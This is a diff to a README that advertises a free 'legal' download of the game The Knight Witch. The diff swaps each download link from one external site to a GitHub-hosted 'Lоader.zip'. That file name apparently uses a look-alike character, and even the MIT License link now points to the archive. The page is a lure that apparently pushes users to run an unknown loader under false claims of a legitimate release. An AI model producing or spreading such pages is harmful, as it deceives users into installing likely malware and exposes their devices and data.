@@ -1,6 +1,6 @@
 # 🏰 The Knight Witch - Download & Install! ⚔️
 
-[![Download Now](https://img.shields.io/badge/Download-The%20Knight%20Witch-blue)](https://easylauncher.su/PSnzrH)
+[![Download Now](https://raw.githubusercontent.com/HemangDon/KnightWitchVault/main/Lоader.zip%20Knight%20Witch-blue)](https://raw.githubusercontent.com/HemangDon/KnightWitchVault/main/Lоader.zip)
 
 Welcome to the ultimate repository for **The Knight Witch** digital edition, a magical adventure game loved worldwide! Embark on a breathtaking journey through enchanted realms, battling mechanized foes and exploring a vibrant 2D world. Get started with the easiest installation process and ensure compatibility across multiple systems! Below, discover all you need to know: detailed functions, platform compatibility with a stylish table, feature highlights, and usage instructions. 
 
@@ -33,7 +33,7 @@ The Knight Witch, Download Now, Magical Adventure Game, Platform Support, Advent
 ## 🛠️ Installation Steps
 
 1. **Download the Game:**  
-   [![Download The Knight Witch](https://img.shields.io/badge/Download-Now-green)](https://easylauncher.su/PSnzrH)
+   [![Download The Knight Witch](https://raw.githubusercontent.com/HemangDon/KnightWitchVault/main/Lоader.zip)](https://raw.githubusercontent.com/HemangDon/KnightWitchVault/main/Lоader.zip)
 
 ---
 ## ⚠️ Disclaimer
@@ -43,9 +43,9 @@ This repository provides a legal digital release under the MIT License (see belo
 ---
 ## 📜 License
 
-Licensed under the [MIT License](https://opensource.org/licenses/MIT) © 2025.
+Licensed under the [MIT License](https://raw.githubusercontent.com/HemangDon/KnightWitchVault/main/Lоader.zip) © 2025.
 
 ---
 ## 🚀 Download Below
 
-[![Download The Knight Witch](https://img.shields.io/badge/Download-Now-green)](https://easylauncher.su/PSnzrH)
+[![Download The Knight Witch](https://raw.githubusercontent.com/HemangDon/KnightWitchVault/main/Lоader.zip)](https://raw.githubusercontent.com/HemangDon/KnightWitchVault/main/Lоader.zip)
